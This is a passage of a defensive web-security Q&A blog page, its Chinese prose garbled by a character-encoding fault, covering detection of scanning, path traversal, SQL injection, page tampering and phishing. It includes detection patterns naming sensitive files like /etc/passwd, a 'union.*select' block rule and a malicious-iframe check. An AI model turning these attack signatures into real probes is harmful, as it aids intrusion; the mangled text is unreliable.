| awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure></li><li><strong>å¼‚å¸¸é€Ÿç‡</strong>ï¼š<ul><li>çŸ­æ—¶é—´å†…å‡ºç°å¤§é‡ <code>SYN</code> è¯·æ±‚ã€‚</li></ul></li></ol><p><strong>é˜²å¾¡æ–¹æ³•</strong>ï¼š</p><ul><li>é…ç½® <code>iptables</code> é™åˆ¶æ‰«æè¡Œä¸ºï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --syn -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 5/s -j ACCEPT</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="å¦‚ä½•å‡†ç¡®è¯†åˆ«æ–‡ä»¶éå†æ¢æµ‹ï¼Ÿ"><a href="#å¦‚ä½•å‡†ç¡®è¯†åˆ«æ–‡ä»¶éå†æ¢æµ‹ï¼Ÿ" class="headerlink" title="å¦‚ä½•å‡†ç¡®è¯†åˆ«æ–‡ä»¶éå†æ¢æµ‹ï¼Ÿ"></a><strong>å¦‚ä½•å‡†ç¡®è¯†åˆ«æ–‡ä»¶éå†æ¢æµ‹ï¼Ÿ</strong></h3><p><strong>å¸¸è§ç‰¹å¾</strong>ï¼š</p><ul><li>è®¿é—® <code>/etc/passwd</code>ã€<code>/proc/self/environ</code> ç­‰æ•æ„Ÿæ–‡ä»¶ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;passwd&quot;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure></li><li>URL ç»“å°¾åŒ…å« <code>../</code>ã€<code>..%2f</code>ï¼ˆè·¯å¾„éå†ç¼–ç ï¼‰ã€‚</li></ul><p><strong>é˜²å¾¡æªæ–½</strong>ï¼š</p><ul><li>åœ¨ <code>Nginx</code> é…ç½®ç¦æ­¢ç›®å½•éå†ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ &quot;\.\.&quot;</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="SQL-æ³¨å…¥æ‹¦æˆªè§„åˆ™å¦‚ä½•å®ç°ï¼Ÿ"><a href="#SQL-æ³¨å…¥æ‹¦æˆªè§„åˆ™å¦‚ä½•å®ç°ï¼Ÿ" class="headerlink" title="SQL æ³¨å…¥æ‹¦æˆªè§„åˆ™å¦‚ä½•å®ç°ï¼Ÿ"></a><strong>SQL æ³¨å…¥æ‹¦æˆªè§„åˆ™å¦‚ä½•å®ç°ï¼Ÿ</strong></h3><p><strong>å¸¸è§ SQL æ³¨å…¥ç‰¹å¾</strong>ï¼š</p><ul><li>å‘ç° <code>UNION SELECT</code>ã€<code>ORDER BY</code> å…³é”®è¯ã€‚</li><li>URL åŒ…å« <code>--</code>ã€<code>#</code>ï¼ˆSQL æ³¨é‡Šï¼‰ã€‚</li></ul><p><strong>æ‹¦æˆªæ–¹å¼</strong>ï¼š</p><ul><li><strong>WAF è§„åˆ™</strong>ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$query_string</span> <span class="regexp">~ &quot;union.*select&quot;)</span> &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>æ•°æ®åº“å®‰å…¨ç­–ç•¥</strong>ï¼š<ul><li>é‡‡ç”¨ <strong>å‚æ•°åŒ–æŸ¥è¯¢</strong>ï¼Œé¿å…æ‹¼æ¥ SQLï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE id = %s&quot;</span>, (user_id,))</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h3 id="å¦‚ä½•å®ç°é¡µé¢ç¯¡æ”¹æ„ŸçŸ¥ï¼Ÿ"><a href="#å¦‚ä½•å®ç°é¡µé¢ç¯¡æ”¹æ„ŸçŸ¥ï¼Ÿ" class="headerlink" title="å¦‚ä½•å®ç°é¡µé¢ç¯¡æ”¹æ„ŸçŸ¥ï¼Ÿ"></a><strong>å¦‚ä½•å®ç°é¡µé¢ç¯¡æ”¹æ„ŸçŸ¥ï¼Ÿ</strong></h3><p><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼š</p><ol><li><strong>å®šæœŸå¯¹æ¯”é¡µé¢å“ˆå¸Œå€¼</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> index.html</span><br></pre></td></tr></table></figure></li><li><strong>å¯ç”¨ Content Security Policyï¼ˆCSPï¼‰</strong>ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><strong>åˆ©ç”¨ <code>Selenium</code> ç›‘æµ‹é¡µé¢ DOM å˜åŒ–</strong>ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">&quot;//script[contains(text(),&#x27;malicious&#x27;)]&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="å¦‚ä½•å®ç°é¡µé¢æŒ‚é©¬æ„ŸçŸ¥ï¼Ÿ"><a href="#å¦‚ä½•å®ç°é¡µé¢æŒ‚é©¬æ„ŸçŸ¥ï¼Ÿ" class="headerlink" title="å¦‚ä½•å®ç°é¡µé¢æŒ‚é©¬æ„ŸçŸ¥ï¼Ÿ"></a><strong>å¦‚ä½•å®ç°é¡µé¢æŒ‚é©¬æ„ŸçŸ¥ï¼Ÿ</strong></h3><p><strong>æŒ‚é©¬æ£€æµ‹æ–¹å¼</strong>ï¼š</p><ol><li><strong>å®šæœŸæ‰«æ <code>script</code> æ ‡ç­¾ï¼Œå‘ç°å¼‚å¸¸ URL</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;&lt;script src=&quot;</span> /var/www/html/index.html</span><br></pre></td></tr></table></figure></li><li><strong>æ£€æµ‹æ¶æ„ <code>iframe</code> æ³¨å…¥</strong>ï¼š<ul><li>ç›‘æµ‹ <code>&lt;iframe&gt;</code> æŒ‡å‘æœªçŸ¥åŸŸåï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html_content, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> iframe <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;iframe&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;attack.com&quot;</span> <span class="keyword">in</span> iframe[<span class="string">&#x27;src&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Malicious iframe detected!&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="å¦‚ä½•ç¡®ä¿çº¿ä¸Šæ‹¦æˆªè§„åˆ™ä¸å‡ºç°è¯¯æ‹¦æˆªï¼Ÿ"><a href="#å¦‚ä½•ç¡®ä¿çº¿ä¸Šæ‹¦æˆªè§„åˆ™ä¸å‡ºç°è¯¯æ‹¦æˆªï¼Ÿ" class="headerlink" title="å¦‚ä½•ç¡®ä¿çº¿ä¸Šæ‹¦æˆªè§„åˆ™ä¸å‡ºç°è¯¯æ‹¦æˆªï¼Ÿ"></a><strong>å¦‚ä½•ç¡®ä¿çº¿ä¸Šæ‹¦æˆªè§„åˆ™ä¸å‡ºç°è¯¯æ‹¦æˆªï¼Ÿ</strong></h3><p><strong>è¯¯æ‹¦æˆªåˆ†æ</strong>ï¼š</p><ol><li><strong>å›æ”¾æ‹¦æˆªæ—¥å¿—</strong>ï¼Œåˆ†æè¢«æ‹¦æˆªè¯·æ±‚ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/nginx/access.log | grep <span class="string">&quot;403&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>ç°åº¦æµ‹è¯•</strong>ï¼š<ul><li>å…ˆåœ¨ <strong>é•œåƒæµé‡ç¯å¢ƒ</strong> ä¸­æµ‹è¯•è§„åˆ™ï¼Œç¡®ä¿ä¸ä¼šå½±å“æ­£å¸¸æµé‡ã€‚</li></ul></li><li><strong>ç»“åˆ AI é£æ§</strong>ï¼š<ul><li>é€šè¿‡ <strong>å¼‚å¸¸åˆ†æ•°è®¡ç®—</strong> è¯†åˆ«è¯¯æŠ¥ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> IsolationForest</span><br><span class="line">model = IsolationForest()</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="å¦‚ä½•è¯†åˆ«å…¬å…±å’Œç§æœ‰æ¥å£ï¼Ÿ"><a href="#å¦‚ä½•è¯†åˆ«å…¬å…±å’Œç§æœ‰æ¥å£ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¯†åˆ«å…¬å…±å’Œç§æœ‰æ¥å£ï¼Ÿ"></a><strong>å¦‚ä½•è¯†åˆ«å…¬å…±å’Œç§æœ‰æ¥å£ï¼Ÿ</strong></h3><ol><li><strong>æ ¹æ® API è·¯ç”±æ¨¡å¼</strong>ï¼š<ul><li><code>/api/public/</code> å¯èƒ½ä¸ºå…¬å…±æ¥å£ã€‚</li><li><code>/admin/</code> å¯èƒ½ä¸ºç§æœ‰æ¥å£ã€‚</li></ul></li><li><strong>åŸºäºé‰´æƒæ£€æµ‹</strong>ï¼š<ul><li>å‘é€è¯·æ±‚ï¼Œæ—  Token ä»è¿”å› 200ï¼Œåˆ™å¯èƒ½ä¸ºå…¬å…±æ¥å£ã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•è¯†åˆ«æœºå™¨è¡Œä¸ºè¯·æ±‚ï¼Ÿ"><a href="#å¦‚ä½•è¯†åˆ«æœºå™¨è¡Œä¸ºè¯·æ±‚ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¯†åˆ«æœºå™¨è¡Œä¸ºè¯·æ±‚ï¼Ÿ"></a><strong>å¦‚ä½•è¯†åˆ«æœºå™¨è¡Œä¸ºè¯·æ±‚ï¼Ÿ</strong></h3><p><strong>æœºå™¨è¯·æ±‚ç‰¹å¾</strong>ï¼š</p><ol><li><strong>User-Agent å¼‚å¸¸</strong>ï¼š<ul><li>çˆ¬è™«é€šå¸¸ä½¿ç”¨ <code>curl</code>ã€<code>Python-requests</code>ã€‚</li></ul></li><li><strong>è¯·æ±‚é¢‘ç‡å¼‚å¸¸</strong>ï¼š<ul><li>çŸ­æ—¶é—´å†…å¤§é‡è¯·æ±‚ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> /var/log/nginx/access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>è¡Œä¸ºæ¨¡å¼å¼‚å¸¸</strong>ï¼š<ul><li>æ­£å¸¸ç”¨æˆ·ä¸ä¼š <strong>è¿ç»­ç‚¹å‡»å¤šä¸ªé¡µé¢</strong>ã€‚</li></ul></li></ol><p><strong>æ£€æµ‹æ–¹å¼</strong>ï¼š</p><ul><li>ç»“åˆ <strong>CAPTCHA</strong> è¿›è¡ŒéªŒè¯ã€‚</li><li>é‡‡ç”¨ <strong>è¡Œä¸ºæŒ‡çº¹åˆ†æ</strong>ï¼ˆé¼ æ ‡è½¨è¿¹ã€äººæœºäº¤äº’ï¼‰ã€‚</li></ul><hr><h3 id="å¦‚ä½•æ„ŸçŸ¥è¢«åŠ¨é£é™©ï¼Ÿ"><a href="#å¦‚ä½•æ„ŸçŸ¥è¢«åŠ¨é£é™©ï¼Ÿ" class="headerlink" title="å¦‚ä½•æ„ŸçŸ¥è¢«åŠ¨é£é™©ï¼Ÿ"></a><strong>å¦‚ä½•æ„ŸçŸ¥è¢«åŠ¨é£é™©ï¼Ÿ</strong></h3><ol><li><strong>ç›‘æµ‹è¢«åŠ¨ DNS</strong>ï¼š<ul><li>å‘ç°æ˜¯å¦æœ‰æ¶æ„åŸŸåè§£æï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;badsite.com&quot;</span> /var/log/dnsmasq.log</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æµé‡ä¾§æ„ŸçŸ¥</strong>ï¼š<ul><li>è¢«åŠ¨åˆ†ææµé‡ï¼Œæ£€æµ‹ C2 é€šä¿¡ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bro -r capture.pcap</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>å¨èƒæƒ…æŠ¥å…³è”</strong>ï¼š<ul><li>ç»“åˆ <code>Threat Intelligence</code>ï¼ŒåŒ¹é…æ¶æ„ IP è®¿é—®æ—¥å¿—ã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•åˆ¤æ–­æ”»å‡»è¯·æ±‚æ˜¯å®šç‚¹æ”»å‡»è¿˜æ˜¯éšæœºæ‰«æï¼Ÿ"><a href="#å¦‚ä½•åˆ¤æ–­æ”»å‡»è¯·æ±‚æ˜¯å®šç‚¹æ”»å‡»è¿˜æ˜¯éšæœºæ‰«æï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ¤æ–­æ”»å‡»è¯·æ±‚æ˜¯å®šç‚¹æ”»å‡»è¿˜æ˜¯éšæœºæ‰«æï¼Ÿ"></a><strong>å¦‚ä½•åˆ¤æ–­æ”»å‡»è¯·æ±‚æ˜¯å®šç‚¹æ”»å‡»è¿˜æ˜¯éšæœºæ‰«æï¼Ÿ</strong></h3><p><strong>å®šç‚¹æ”»å‡»</strong>ï¼š</p><ul><li>é’ˆå¯¹ <strong>ç‰¹å®š URL</strong>ï¼Œå¦‚ <code>/admin/login</code>ï¼Œé•¿æœŸæ”»å‡»åŒä¸€æ¥å£ã€‚</li><li>ç›®æ ‡æ˜ç¡®ï¼Œé€šå¸¸ä¼´éš <strong>å¯†ç çˆ†ç ´</strong> æˆ– <strong>ä¸šåŠ¡æ»¥ç”¨</strong>ã€‚</li></ul><p><strong>éšæœºæ‰«æ</strong>ï¼š</p><ul><li>çŸ­æ—¶é—´å†…è®¿é—®å¤šä¸ª URLï¼Œç±»ä¼¼ <code>dirb</code>ã€<code>gobuster</code> è¡Œä¸ºï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;404&quot;</span> /var/log/nginx/access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br></pre></td></tr></table></figure></li><li>ç›®æ ‡æ¨¡ç³Šï¼Œå°è¯• <strong>è·¯å¾„éå†ã€å­åŸŸåçˆ†ç ´</strong>ã€‚</li></ul><hr><h3 id="å¦‚ä½•è¯†åˆ«å®¢æˆ·ç«¯çš„ç³»ç»ŸçœŸå®ç±»å‹ï¼Ÿ"><a href="#å¦‚ä½•è¯†åˆ«å®¢æˆ·ç«¯çš„ç³»ç»ŸçœŸå®ç±»å‹ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¯†åˆ«å®¢æˆ·ç«¯çš„ç³»ç»ŸçœŸå®ç±»å‹ï¼Ÿ"></a><strong>å¦‚ä½•è¯†åˆ«å®¢æˆ·ç«¯çš„ç³»ç»ŸçœŸå®ç±»å‹ï¼Ÿ</strong></h3><h2 id="æ£€æµ‹æ–¹æ³•ï¼š1-åŸºäº-User-Agent-ï¼š-2-JS-æŒ‡çº¹è¯†åˆ«ï¼š-é€šè¿‡-navigator-platform-è·å–ç³»ç»Ÿç±»å‹ï¼š-3-TLS-æŒ‡çº¹åˆ†æï¼š-é€šè¿‡-JA3-è¯†åˆ«ç³»ç»Ÿç‰¹å¾ï¼š"><a href="#æ£€æµ‹æ–¹æ³•ï¼š1-åŸºäº-User-Agent-ï¼š-2-JS-æŒ‡çº¹è¯†åˆ«ï¼š-é€šè¿‡-navigator-platform-è·å–ç³»ç»Ÿç±»å‹ï¼š-3-TLS-æŒ‡çº¹åˆ†æï¼š-é€šè¿‡-JA3-è¯†åˆ«ç³»ç»Ÿç‰¹å¾ï¼š" class="headerlink" title="æ£€æµ‹æ–¹æ³•ï¼š1. **åŸºäº User-Agent**ï¼š   2. JS æŒ‡çº¹è¯†åˆ«ï¼š   - é€šè¿‡ navigator.platform è·å–ç³»ç»Ÿç±»å‹ï¼š     3. TLS æŒ‡çº¹åˆ†æï¼š   - é€šè¿‡ JA3 è¯†åˆ«ç³»ç»Ÿç‰¹å¾ï¼š     "></a><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼š<br>1. **åŸºäº <code>User-Agent</code>**ï¼š<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Windows NT&quot;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure><br>2. <strong>JS æŒ‡çº¹è¯†åˆ«</strong>ï¼š<br>   - é€šè¿‡ <code>navigator.platform</code> è·å–ç³»ç»Ÿç±»å‹ï¼š<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(navigator.<span class="property">platform</span>);</span><br></pre></td></tr></table></figure><br>3. <strong>TLS æŒ‡çº¹åˆ†æ</strong>ï¼š<br>   - é€šè¿‡ <strong>JA3</strong> è¯†åˆ«ç³»ç»Ÿç‰¹å¾ï¼š<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ja3 -r capture.pcap</span><br></pre></td></tr></table></figure></h2><h3 id="æœ‰å“ªäº›å¯ä»¥æ”¶é›†çš„æƒ…æŠ¥æ¸ é“ï¼Ÿ"><a href="#æœ‰å“ªäº›å¯ä»¥æ”¶é›†çš„æƒ…æŠ¥æ¸ é“ï¼Ÿ" class="headerlink" title="æœ‰å“ªäº›å¯ä»¥æ”¶é›†çš„æƒ…æŠ¥æ¸ é“ï¼Ÿ"></a><strong>æœ‰å“ªäº›å¯ä»¥æ”¶é›†çš„æƒ…æŠ¥æ¸ é“ï¼Ÿ</strong></h3><p><strong>å¨èƒæƒ…æŠ¥æ¥æº</strong>ï¼š</p><ol><li><strong>å¼€æºæƒ…æŠ¥ï¼ˆOSINTï¼‰</strong>ï¼š<ul><li><code>Shodan</code>ã€<code>Censys</code> å‘ç°æš´éœ²çš„ä¼ä¸šèµ„äº§ã€‚</li><li><code>Twitter</code>ã€<code>Telegram</code> ç›‘æ§é»‘å®¢è®¨è®ºã€‚</li></ul></li><li><strong>å•†ä¸šæƒ…æŠ¥</strong>ï¼š<ul><li>è®¢é˜… <code>Recorded Future</code>ã€<code>CrowdStrike</code> æä¾›çš„æƒ…æŠ¥æ•°æ®ã€‚</li></ul></li><li><strong>æš—ç½‘æƒ…æŠ¥</strong>ï¼š<ul><li>ç›‘æ§ <code>Tor</code>ã€<code>I2P</code> å‘ç°æ³„éœ²æ•°æ®ã€‚</li></ul></li><li><strong>èœœç½æ•°æ®</strong>ï¼š<ul><li>é€šè¿‡ <code>Cowrie</code> æ•è·æ”»å‡»è€…è¡Œä¸ºï¼Œåˆ†æ C2 æœåŠ¡å™¨åœ°å€ã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•å¿«é€Ÿç­›é€‰å‡ºæœ€æ–°çš„-CVE-å¯¹æˆ‘ä»¬æ˜¯å¦æœ‰å®é™…å½±å“ï¼Ÿ"><a href="#å¦‚ä½•å¿«é€Ÿç­›é€‰å‡ºæœ€æ–°çš„-CVE-å¯¹æˆ‘ä»¬æ˜¯å¦æœ‰å®é™…å½±å“ï¼Ÿ" class="headerlink" title="å¦‚ä½•å¿«é€Ÿç­›é€‰å‡ºæœ€æ–°çš„ CVE å¯¹æˆ‘ä»¬æ˜¯å¦æœ‰å®é™…å½±å“ï¼Ÿ"></a><strong>å¦‚ä½•å¿«é€Ÿç­›é€‰å‡ºæœ€æ–°çš„ CVE å¯¹æˆ‘ä»¬æ˜¯å¦æœ‰å®é™…å½±å“ï¼Ÿ</strong></h3><p><strong>ç­›é€‰æ­¥éª¤</strong>ï¼š</p><ol><li><strong>è§£æ CVE å½±å“èŒƒå›´</strong>ï¼š<ul><li>å…³æ³¨ <code>CWE</code> åˆ†ç±»ï¼ˆå¦‚ <code>CWE-79</code> ä»£è¡¨ XSSï¼‰ã€‚</li></ul></li><li><strong>æ¯”å¯¹è‡ªèº«èµ„äº§</strong>ï¼š<ul><li>æ£€æŸ¥ä¼ä¸šå†…éƒ¨ä½¿ç”¨çš„è½¯ä»¶ç‰ˆæœ¬ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep openssl</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>PoC å¤ç°æµ‹è¯•</strong>ï¼š<ul><li>è¿è¡Œ <code>Exploit-DB</code> æˆ– <code>Metasploit</code> è¿›è¡ŒéªŒè¯ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit CVE-2024-1234</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="ç»™å®šä¸€ä¸ªç½‘å€ï¼Œå¦‚ä½•è‡ªåŠ¨åŒ–è¯†åˆ«å…¶æ˜¯å¦ä¸ºé’“é±¼ç½‘ç«™ï¼Ÿ"><a href="#ç»™å®šä¸€ä¸ªç½‘å€ï¼Œå¦‚ä½•è‡ªåŠ¨åŒ–è¯†åˆ«å…¶æ˜¯å¦ä¸ºé’“é±¼ç½‘ç«™ï¼Ÿ" class="headerlink" title="ç»™å®šä¸€ä¸ªç½‘å€ï¼Œå¦‚ä½•è‡ªåŠ¨åŒ–è¯†åˆ«å…¶æ˜¯å¦ä¸ºé’“é±¼ç½‘ç«™ï¼Ÿ"></a><strong>ç»™å®šä¸€ä¸ªç½‘å€ï¼Œå¦‚ä½•è‡ªåŠ¨åŒ–è¯†åˆ«å…¶æ˜¯å¦ä¸ºé’“é±¼ç½‘ç«™ï¼Ÿ</strong></h3><p><strong>è¯†åˆ«æ­¥éª¤</strong>ï¼š</p><ol><li><strong>åŸŸåç›¸ä¼¼æ€§åˆ†æ</strong>ï¼š<ul><li>è®¡ç®— <code>Levenshtein è·ç¦»</code>ï¼Œæ£€æµ‹æ˜¯å¦æ¨¡ä»¿å®˜æ–¹åŸŸåï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fuzzywuzzy <span class="keyword">import</span> fuzz</span><br><span class="line">fuzz.ratio(<span class="string">&quot;paypa1.com&quot;</span>, <span class="string">&quot;paypal.com&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>è¯ä¹¦åˆ†æ</strong>ï¼š<ul><li>æ£€æµ‹ HTTPS è¯ä¹¦ç­¾å‘æ–¹ï¼Œé’“é±¼ç«™å¸¸ä½¿ç”¨ <code>Let&#39;s Encrypt</code> è¯ä¹¦ã€‚</li></ul></li><li><strong>é¡µé¢å†…å®¹ç‰¹å¾</strong>ï¼š<ul><li>ä½¿ç”¨ <code>Selenium</code> è·å–ç½‘ç«™æˆªå›¾ï¼Œä¸å®˜æ–¹ç«™ç‚¹æ¯”å¯¹ UI ç›¸ä¼¼åº¦ã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•è¯†åˆ«ä»¿å†’-APPï¼Ÿ"><a href="#å¦‚ä½•è¯†åˆ«ä»¿å†’-APPï¼Ÿ" class="headerlink" title="å¦‚ä½•è¯†åˆ«ä»¿å†’ APPï¼Ÿ"></a><strong>å¦‚ä½•è¯†åˆ«ä»¿å†’ APPï¼Ÿ</strong></h3><p><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼š</p><ol><li><strong>ç­¾åæ ¡éªŒ</strong>ï¼š<ul><li>é€šè¿‡ <code>apksigner</code> æ£€æµ‹ APK ç­¾åï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apksigner verify --print-certs fake_app.apk</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>åŠ¨æ€è¡Œä¸ºåˆ†æ</strong>ï¼š<ul><li>ä½¿ç”¨ <code>Frida</code> Hook APIï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸æƒé™è¯·æ±‚ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line">session = frida.get_usb_device().attach(<span class="string">&quot;fake_app&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>å¸‚åœºç›‘æ§</strong>ï¼š<ul><li>åœ¨ <code>Google Play</code>ã€<code>ç¬¬ä¸‰æ–¹åº”ç”¨å•†åº—</code> ç›‘æ§ç›¸ä¼¼ APPã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•è¯†åˆ«ä¸€ä¸ªæ²¡æœ‰ç™»é™†çš„ç”¨æˆ·çœŸå®èº«ä»½ï¼Ÿ"><a href="#å¦‚ä½•è¯†åˆ«ä¸€ä¸ªæ²¡æœ‰ç™»é™†çš„ç”¨æˆ·çœŸå®èº«ä»½ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¯†åˆ«ä¸€ä¸ªæ²¡æœ‰ç™»é™†çš„ç”¨æˆ·çœŸå®èº«ä»½ï¼Ÿ"></a><strong>å¦‚ä½•è¯†åˆ«ä¸€ä¸ªæ²¡æœ‰ç™»é™†çš„ç”¨æˆ·çœŸå®èº«ä»½ï¼Ÿ</strong></h3><p><strong>è¯†åˆ«æ–¹æ³•</strong>ï¼š</p><ol><li><strong>åŸºäºæŒ‡çº¹è¯†åˆ«</strong>ï¼š<ul><li>é‡‡é›†æµè§ˆå™¨ <code>Canvas Fingerprint</code>ã€<code>User-Agent</code> ç­‰ç‰¹å¾ã€‚</li></ul></li><li><strong>åŸºäºè¡Œä¸ºåˆ†æ</strong>ï¼š<ul><li>ç›‘æµ‹é¼ æ ‡ç§»åŠ¨è½¨è¿¹ï¼ŒAI è¯†åˆ«äººç±» vs æœºå™¨äººï¼š<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">clientX</span>, e.<span class="property">clientY</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>IP åœ°å€æº¯æº</strong>ï¼š<ul><li>ä½¿ç”¨ <code>MaxMind</code> åº“è¯†åˆ«ç”¨æˆ· IP å½’å±åœ°ã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•æ‰¾å‡ºå¯¹æˆ‘ä»¬ä¸šåŠ¡å®æ–½ç½‘ç»œæ”»å‡»çš„é»‘å®¢çœŸå®èº«ä»½ï¼Ÿ"><a href="#å¦‚ä½•æ‰¾å‡ºå¯¹æˆ‘ä»¬ä¸šåŠ¡å®æ–½ç½‘ç»œæ”»å‡»çš„é»‘å®¢çœŸå®èº«ä»½ï¼Ÿ" class="headerlink" title="å¦‚ä½•æ‰¾å‡ºå¯¹æˆ‘ä»¬ä¸šåŠ¡å®æ–½ç½‘ç»œæ”»å‡»çš„é»‘å®¢çœŸå®èº«ä»½ï¼Ÿ"></a><strong>å¦‚ä½•æ‰¾å‡ºå¯¹æˆ‘ä»¬ä¸šåŠ¡å®æ–½ç½‘ç»œæ”»å‡»çš„é»‘å®¢çœŸå®èº«ä»½ï¼Ÿ</strong></h3><p><strong>æº¯æºæ–¹æ³•</strong>ï¼š</p><ol><li><strong>IP 